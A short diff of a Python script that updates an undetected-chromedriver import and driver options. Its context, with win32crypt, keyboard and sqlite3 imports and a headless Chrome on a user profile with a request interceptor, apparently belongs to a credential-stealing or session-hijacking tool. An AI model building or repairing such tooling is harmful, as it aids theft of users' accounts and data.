@@ -17,7 +17,7 @@ else:
 	exit()
 
 import time,psutil,re,sqlite3,traceback,os,json,win32con,win32api,win32gui,win32process,win32crypt,requests,keyboard,shutil,base64
-from seleniumwire.undetected_chromedriver.v2 import uc
+from seleniumwire.undetected_chromedriver import uc
 from time import sleep as s
 from re import search
 from winreg import HKEY_CURRENT_USER, OpenKey, QueryValueEx
@@ -285,7 +285,7 @@ def interceptor(request):
 opts = uc.ChromeOptions()
 opts.headless = True
 opts.add_argument(r'--user-data-dir='+fp)
-driver = uc.Chrome(use_subprocess=True, options=opts)
+driver = uc.Chrome(options=opts)
 driver.execute_cdp_cmd('Network.setBlockedURLs', {"urls": ['*png','*jpeg','*woff','*woff2','*jpg','*gif','*jpeg','*css','*mp4','*mkv']})
 driver.execute_cdp_cmd('Network.enable', {})
 driver.request_interceptor = interceptor
